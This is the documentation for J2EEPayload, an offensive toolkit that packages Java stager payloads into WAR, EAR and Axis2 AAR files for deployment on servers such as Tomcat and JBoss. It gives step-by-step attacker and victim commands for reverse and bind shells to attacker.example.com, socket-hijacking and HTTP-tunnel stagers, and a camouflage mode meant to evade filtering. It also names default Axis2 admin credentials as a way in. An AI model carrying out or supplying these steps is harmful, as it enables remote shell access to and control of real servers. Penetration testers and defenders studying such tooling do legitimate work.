<h1>J2EEPayload - Java Stager Payloads for enterprise servers</h1>

<p><i>&copy; 2010-2012 Michael 'mihi' Schierl, <tt>&lt;schierlm
at users dot sourceforge dot net&gt;</tt></i></p>

<p>Based on <a
	href="http://schierlm.users.sourceforge.net/JavaPayload/">JavaPayload
0.5</a></p>

<h2>Introduction</h2>

<p>The <a href="http://schierlm.users.sourceforge.net/JavaPayload/">JavaPayload</a>s
contain useful payloads written in pure Java to leverage vulnerabilities
in J2SE environments. But when you find a FTP directory called <tt>webapps</tt>
or <tt>deploy</tt> where there are WAR or EAR files in them, they do not
directly help you, because they do not contain stagers suitable for this
environment</p>

<p>Therefore, this archive contains a collection of WAR and EAR
compatible stagers that use a variety of communication methods to
communicate back to the attacker - even if the only open port is the
HTTP/JNDI port, or even if no incoming ports are open but the victim can
call back (which can be tricky as usually WARs and EARs are initialized
on demand).</p>

<p>In corporate environments (i. e. "enterprise") you might also
find picky firewalls that reset your connections whenever you send <tt>0xCAFEBABE</tt>,
or the only possible means of communication between attacker and victim
may be a common directory share where both parties have write access.
For forwarding TCP connections in these scenarios, the <a
	href="http://jtcpfwd.sourceforge.net/">jTCPfwd</a> package usually is a
life saver. Therefore, this archive also contains wrapper code that can
be used to wrap a jTCPfwd Listener or Forwarder into a JavaPayload
stager.</p>

<h2>Changes since version 0.1</h2>

<ul>
<li>JavaPayload (and J2EEPayload) is now hosted as a <a href="http://javapayload.sourceforge.net/">SourceForge project</a></li>
<li>Updated JavaPayload to version 0.5</li>
<li>WarBuilder, EarBuilder: Support stripping debug info from classes.</li>
<li>EarBuilder: Support giving a custom output filename, like WarBuilder already did.</li>
<li>Add AarBuilder and Axis2 injector/tunnel.</li>
<li>Add jTCPfwd dynstagers</li>
<li>Add dynstager support to FindSock/Tunnel modules</li>
<li>Add DeadConnect servlet and ConnectURL stager/handler</li>
<li>Add JARLayout for crypting WAR files</li>
</ul>

<h2>System requirements</h2>

<p>In addition to the system requirements of JavaPayload:</p>

<p><b>On the "attacker" machine:</b> Application server client
libraries (matching to the used appplication serve for attacking an
application server via EJB. No additional requirements for attacking a
servlet container.</p>

<p><b>On the "victim" machine:</b> Java Runtime Environment 1.4, and
a Servlet-2.2 compatible servlet container or an EJB2 compatible
application server.</p>

<p>For the jTCPfwd stagers: no additional system requirements in
addition to those of JavaPayload and jTCPfwd.</p>

<h2>Quickstart</h2>

<p>This quickstart is divided into two parts: First about exploiting
servlet containers (like Apache Tomcat), then about exploiting J2EE
application servers (like JBoss). As most application servers also
contain a servlet container, the servlet exploits can also be used for
application servers, if their HTTP port is reachable from the attacker's
machine.</p>

<p>This quickstart assumes that you have completed the quickstart of
JavaPayload before and you know how handlers, stagers and stages
interact.</p>

<h2>Servlets</h2>

<p>Servlets are Java classes that handle HTTP requests in a servlet
container. Usually you can deploy servlets by packing them into a WAR
file and upload it into a <tt>webapps</tt> or <tt>deploy</tt> directory.
The servlets will automatically be deployed and can be accessed by the
path starting with the WAR file name.</p>

<p>Servlet stagers have been tested with Apache Tomcat 3.2, 4.0,
5.0, 5.5, 6.0 and 7.0beta; Jetty 4.2 and 6.1; JBoss 3.2.3 and 5.1.</p>

<p>In the following examples I assume that you have <tt>J2EEPayload.jar</tt>,
<tt>JavaPayload.jar</tt>, <tt>jTCPfwd.jar</tt> and <tt>servlet-api-2.2.jar</tt>
in your classpath.</p>

<p>It is also possible to run <tt>java -jar J2EEPayload.jar</tt> to get into
JavaPayload CLI with all the J2EE payloads already loaded.</p>

<h3>Launching "normal" stagers on the servlet container</h3>

<p>The "JavaPayload" servlet (path <tt>/jp</tt>) can be used to
interactively launch stagers on the servlet server. For this, you have
to build a war that includes the stagers you want to use.</p>

<p><b>On the "attacker" machine:</b></p>
<p><tt>java j2eepayload.builder.WarBuilder Example1.war BindTCP
ReverseTCP</tt></p>
<p><tt>java javapayload.handler.stager.StagerHandler ReverseTCP
attacker.example.com 2010 -- JSh</tt></p>

<p><b>On the "victim" machine:</b></p>
<p>deploy Example1.war to the victim machine (victim.example.com).</p>
<p>Open <tt>http://victim.example.com/Example1/jp</tt> in your web
browser.</p>
<p>Enter <tt>ReverseTCP attacker.example.com 2010 -- JSh</tt> into
the input box and hit return.</p>

<h3>Loading a "normal" stager automatically when a servlet is
deployed</h3>

<p>In rare cases, the attacker can deploy a servlet to a servlet
container but cannot access that container via HTTP. But, for some
strange reasons, the servlet container can connect back to the attacker.
If the servlet container supports the <tt>&lt;load-on-startup/&gt;</tt>
directive (most do, but not all), you can configure a servlet to be
initialized after it is deployed, not (as usual) when it is first
accessed. This scenario is supported by J2EEPayloads.</p>

<p><b>On the "attacker" machine"</b></p>
<p><tt>java j2eepayload.builder.WarBuilder Example2.war
ReverseTCP -- ReverseTCP attacker.example.com 2010 -- JSh</tt></p>
<p><tt>java javapayload.handler.stager.StagerHandler ReverseTCP
attacker.example.com 2010 -- JSh</tt></p>

<p><b>On the "victim" machine:</b></p>
<p>deploy Example2.war to the victim machine, that's it.</p>

<h3>Using the ServletFindSock stager</h3>

<p>A "FindSock" stager is a stager that tries to "find" the socket
that was used to initiate a HTTP connection and hijack it for sending
data in both directions. Unlike native findsock implementations, this
implementation is in pure Java and uses reflection (starting on the
Request and Response objects) to find an object of type java.net.Socket
or java.nio.channels.SocketChannel in one of its local variables (or in
objects or arrays referenced in local variables, recursively). This
works amazingly well in most cases where the whole servlet container is
written in Java. In cases where sockets are handled in native code (most
servlet connectors for "traditional" webservers, and also when using
Apache APR for Tomcat), this stager will fail, though. For the Apache
APR case, see the next section. In case the servlet container insists to
close the socket quickly, you can add a fifth parameter of "C" which
will clone the Socket object and render the original one useless (by
removing its SocketImpl reference).</p>

<p>To debug the stager, you can use a fifth argument of "V"
(verbose) to print out all the classes and objects the FindSock stager
finds on its way instead of hijacking the socket.</p>

<p>This stager is useful if the only connection you can make to the
victim machine is via HTTP, and there is no way to connect back to thee
attacker either. Note that the FindSock stager will not work via HTTPS.</p>

<p><b>On the "attacker" machine</b></p>
<p><tt>java j2eepayload.builder.WarBuilder Example3.war
ServletFindSock</tt></p>
<p>deploy Example3.war to the victim machine (victim.example.com)</p>
<p><tt>java javapayload.handler.stager.StagerHandler
ServletFindSock victim.example.com 80 /Example3 -- JSh</tt></p>

<h3>Using the ServletApacheFindSock stager</h3>

<p>In case you are sure that the target is an Apache server, the
ApacheFindSock servlet can be used; this one uses some native method
trickery to access native APR sockets (as well as the traditional
findsock approach, of course). Note that running this stager on
non-Apache servers will most likely crash the server; in rare cases it
might even crash Apache servers. If the APR method fails (and the server
has not crashed yet), it will fall back to the "traditional" FindSock
approach.</p>

<p><b>On the "attacker" machine</b></p>
<p><tt>java j2eepayload.builder.WarBuilder Example3a.war
ServletApacheFindSock</tt></p>
<p>deploy Example3a.war to the victim machine (victim.example.com)</p>
<p><tt>java javapayload.handler.stager.StagerHandler
ServletFindSock victim.example.com 80 /Example3a/apache -- JSh</tt></p>

<h3>Using the ServletTunnel stager</h3>

<p>In cases where the FindSock stager does not work (native
connector, HTTPS, etc.), but the only connection you can use is the
connection to the servlet container, you can still use the ServletTunnel
stager.</p>
<p>Note that this stager is noticably slower and more
traffic-consuming, but as a last resort it can be very useful.</p>

<p>This stager supports two modes, streaming and polling mode. A
third mode is provided by the Camouflage stager, see below. In streaming
mode, it opens two connections to the victim, one POST and one GET
connection. These connections are used to stream incoming and outgoing
data to the servlet, and are never closed. Every 15 seconds a keep-alive
packet is sent. This option is more efficient than the polling mode, but
will fail if some proxy, cache or antivirus waits for the request to
complete before it is forwarded. In polling mode, both the GET and the
POST connections are closed and restarted every time data is sent over
them. So, the GET connection will still wait for data (or a configurable
timeout), but as soon as data can be returned, the connection will be
closed afterwards. The POST connection works the same way. To use
polling mode, you have to add an additional timeout parameter (in
milliseconds) to the stager command line. Try to use a large timeout
(fewer useless requests), but keep it small enough that your
firewall/antivirus does not interrupt the connection before data can be
sent.</p>

<p><b>On the "attacker" machine</b></p>
<p><tt>java j2eepayload.builder.WarBuilder Example4.war
ServletTunnel</tt></p>
<p>deploy Example4.war to the victim machine (victim.example.com)</p>
<p><tt>java javapayload.handler.stager.StagerHandler
ServletTunnel http://victim.example.com/Example4 -- JSh</tt></p>
<p>&mdash; or, to use polling mode (1 second timeout) &mdash;</p>
<p><tt>java javapayload.handler.stager.StagerHandler
ServletTunnel http://victim.example.com/Example4 1000 -- JSh</tt></p>

<h3>Camouflage mode</h3>

<p>In camouflage mode, the stager will use only one POST connection
using the normal URL encoded parameter and HTML response format. One
parameter, named JP, is used to encode all binary data in English-like
looking text (to make filtering harder). The response will be encoded in
English-like looking text on a sample HTML page. No two requests will be
sent at the same time, therefore this will need a lot of more polling
then the other alternative. The code is reused from jTCPfwd's Camouflage
engine, that's why jTCPfwd has to be on the class path for this one to
work.</p>

<p><b>On the "attacker" machine</b></p>
<p><tt>java j2eepayload.builder.WarBuilder Example4c.war ServletCamouflageTunnel</tt></p>
<p>deploy Example4c.war to the victim machine (victim.example.com)</p>
<p><tt>java javapayload.handler.stager.StagerHandler ServletCamouflageTunnel http://victim.example.com/Example4c 1000 -- JSh</tt></p>
<p>&mdash; or, to use your own parameters &mdash;</p>
<p><tt>java javapayload.handler.stager.StagerHandler ServletCamouflageTunnel :http://victim.example.com/Example4c/jpc?count=#C#&amp;x=1#POST#foo=bar&amp;JP=#DATA#&fun=#R99# 1000 -- JSh</tt></p>

<h3>Dynstager support</h3>

<p>All FindSock and Tunnel stagers can use dynstagers, most notably
the <tt>AES</tt> dynstager. There can be only one dynstager configuration in
every WAR file. Just add for example <tt>AES$ mypassword</tt> to the
end of the <tt>WarBuilder</tt> command line (or before the <tt>--</tt>),
if present, and use an <tt>AES$ServletFindSock</tt> or 
<tt>AES$ServletTunnel</tt> stager.</p>

<h2>ConnectURL stager</h2>

<p>Sometimes, it is not possible to establish a direct connection from the
victim to the attacker or vice versa. But it is possible that both parties
connect to a HTTP server where the attacker can upload servlets to (which
might be on the attacker's machine or in the victim's network as well).</p>

<p>In this case, the ConnectURL stager can be used with a DeadConnect
servlet. This servlet will combine stager and handler connections that
use the same token, but will make sure not to connect two stagers or two
handlers. It does not matter who connects first.</p>

<p><b>On the "attacker" machine</b></p>
<p><tt>java javapayload.cli.Main builder Class ConnectURL Conn</tt></p>
<p><tt>java javapayload.cli.Main builder DeadConnectWar DeadConnect.war</tt></p>
<p>deploy DeadConnect.war to shared webserver (shared.example.com)</p>
<p><tt>java javapayload.handler.stager.StagerHandler
ConnectURL http://shared.example.com/DeadConnect/dc MyToken -- JSh</tt></p>
<p>&mdash; or, to use polling mode (1 second timeout) &mdash;</p>
<p><tt>java javapayload.handler.stager.StagerHandler
ConnectURL http://shared.example.com/DeadConnect/dc MyToken 1000 -- JSh</tt></p>

<p><b>On the "victim" machine</b></p>
<p><tt>java Conn ConnectURL http://shared.example.com/DeadConnect/dc MyToken -- JSh</tt></p>
<p>&mdash; or, to use polling mode (1 second timeout) &mdash;</p>
<p><tt>java Conn ConnectURL http://shared.example.com/DeadConnect/dc MyToken 1000 -- JSh</tt></p>

<h2>Axis2 services</h2>

<p>When using the Eclipse wizard to create an Axis2 service from a WSDL, 
I was surprised that the resulting WAR file by default includes an Axis2 
admin tool that can be used to update and add services after deployment
just via HTTP. It can be found by replacing the <tt>/services/Name</tt>
in the URL by <tt>/)axis2-admin</tt>. The default credentials for this
tool are username "<tt>admin</tt>" and password "<tt>axis2</tt>"</p>

<p>The uploaded services have to be in <tt>.aar</tt> format. This format
can be created by the <tt>AarBuilder</tt></p>

<p>In the following examples I assume that you have <tt>J2EEPayload.jar</tt>,
<tt>JavaPayload.jar</tt> and <tt>jTCPfwd.jar</tt> in your classpath.</p>
			
<h3>Launching "normal" stagers</h3>

<p>The <tt>PayloadService</tt> webservice can be used to interactively
launch stages on the servlet server. For this, the <tt>aar</tt> has to
include the stagers you want to use. If you want to call the service
manually, it has an <tt>execute</tt> method that expects the payload
command line as an argument, and will return success on success and
an exception on failure. But you can also use the <tt>AxisInjector</tt>
for starting the payload, as shown below.</p>

<p><b>On the "attacker" machine:</b></p>
<p><tt>java javapayload.builder.Builder Aar Example1.aar BindTCP
ReverseTCP</tt></p>
<p>deploy Example1.aar to the victim machine via axis2-admin.</p>
<p><tt>java javapayload.builder.Injector Axis 
http://victim.example.com/VulnerableWebapp/services/Example1.Example1HttpSoap11Endpoint/
ReverseTCP attacker.example.com 2012 -- JSh</tt></p>
			
<h3>Using the AxisTunnel stager</h3>

<p>The <tt>TunnelService</tt> webservice can be used to tunnel data through
the Axis web service, by using a polling technique similar to the one used
by the ServletTunnel stager.</p>

<p><b>On the "attacker" machine</b></p>
<p><tt>java javapayload.builder.Builder Aar Example2.aar AxisTunnel</tt></p>
<p>deploy Example2.aar to the victim machine via axis2-admin.</p>
<p><tt>java javapayload.builder.Injector Axis 
http://victim.example.com/VulnerableWebapp/services/Example2.Example2HttpSoap11Endpoint/
AxisTunnel 10000 -- JSh</tt></p>

<h2>Enterprise Java Beans (EJBs)</h2>

<p>In case you want to exploit an application server like JBoss
(where you have to deploy EARs), this section is for you.</p>

<p>You can create an EAR that contains only a WAR, by calling <tt>java
j2eepayload.builder.WarBuilder</tt> with parameter <tt>WAR</tt> followed by
the parameters used by WarBuilder, for example:</p>
<p><tt>java j2eepayload.builder.EarBuilder WAR ServletTunnel
ServletFindSock ReverseTCP</tt></p>

<p>If the application server includes a servlet container you can
access, you can use all the attacks above in this way. Note that some
application servers do not support the <tt>&lt;load-on-startup/&gt;</tt>
directive for servlets.</p>

<p>In case you cannot access the servlet container (or there is not
any), you might be able to access an EJB via JNDI. J2EEPayload contains
only Version 2 EJBs, because they are more compatible than the newer
Version 3 ones, and it is usually easier to call them from outside an
application server via JNDI.</p>

<p>When you want to access an EJB from outside an application
server, you need two things:</p>
<ul>
	<li>A <tt>jndi.properties</tt> file in your class path (not in the
	current directory; if it is in the current directory, make sure that <tt>.</tt>
	is in your class path.<br />
	For JBoss this file looks like this:<br />
	<tt>java.naming.factory.initial=org.jnp.interfaces.NamingContextFactory<br />
	java.naming.factory.url.pkgs=org.jboss.naming:org.jnp.interfaces<br />
	java.naming.provider.url=jnp://victim.example.com:1099</tt></li>
	<li>The application server's client library. The version must
	match the version of the application server to be attacked. Either you
	can download it from the victim machine, or you have to know the exact
	version of the application server. The client library for JBoss is
	called <tt>client\jbossall-client.jar</tt>. Note that this client
	library often contains classpath references to other Jar files in the
	same directory, so you might have to copy more than only this file.</li>
</ul>

<p>The EJBs have been tested with JBoss 3.2.3 and JBoss 5.1.</p>

<h3>Launching "normal" stagers via EJB</h3>

<p>Normal stagers can be started via a stateless session bean that
registers itself as <tt>JavaPayload</tt>.</p>

<p><b>On the "attacker" machine</b></p>
<p><tt>java j2eepayload.builder.EarBuilder EJB ReverseTCP</tt></p>
<p><tt>rename EJB_ReverseTCP.ear Example1.ear</tt></p>
<p>deploy Example1.ear to the victim machine</p>
<p><tt>java javapayload.handler.stager.StagerHandler EJB
ReverseTCP attacker.example.com # -- JSh</tt></p>

<h3>Using the EJBTunnel stager</h3>

<p>Data can also be tunneled through the JNDI connection, by using a
stateful session bean that registers itself as <tt>JavaPayloadTunnel</tt>.
There are two instances of this EJB created, one for sending data, one
for receiving, as calling two methods of one EJB simultaneously will
cause trouble.</p>

<p><b>On the "attacker" machine</b></p>
<p><tt>java j2eepayload.builder.EarBuilder EJB EJBTunnel</tt></p>
<p><tt>rename EJB_EJBTunnel.ear Example2.ear</tt></p>
<p>deploy Example2.ear to the victim machine (undeploy Example1.ear
first)</p>
<p><tt>java javapayload.handler.stager.StagerHandler EJBTunnel
-- JSh</tt></p>

<h2>jTCPfwd based stagers</h2>

<h3>Generated stagers</h3>

<p>To create a jTCPfwd based stager, run <tt>java
j2eepayload.builder.JTCPfwdBuilder</tt> (which will need <tt>asm-3.2.jar</tt>
on the class path), followed by <tt>F</tt> or <tt>L</tt> (for Forwarder
or Listener), followed by the jTCPfwd module rule that should be used.
This will create a new file, <tt>jtcpfwd-stager.jar</tt> containing
either a <tt>JTCPfwdForwarder</tt> or <tt>JTCPfwdListener</tt> stager,
that can be used with JavaPayload as usual. It expects one stager
parameter, the rule (again).</p>

<p>To connect to this stager, stager handlers of the same names are
also included in J2EEPayload (or use jTCPfwd standalone and let it
forward data to a normal Bind/Reverse stager handler). These stager
handlers expect two parameters. The first one is the listener/forwarder
rule used by the stager, and the second one is the forwarder/listener
rule the stager handler should use to communicate with the stager (which
is usually not the same as the rule used by the stager).</p>

<h3>Dynstagers</h3>

<p>Dynstagers are the preferred way to use jTCPfwd based stagers.</p>

<p>Use either the <tt>JTCPfwd$<i>name</i>_Forwarder</tt> or 
<tt>JTCPfwd$<i>name</i>_Listener</tt> syntax. Multiple module names
can be separated by <tt>$</tt> signs. In case the dynstager has access
to the full command line, <i>name</i> can be left empty; it is then
automatically inferred from the arguments.</p>

<p>The parameters for the dynstagers and their handlers are the same as
for the generated stagers.</p>
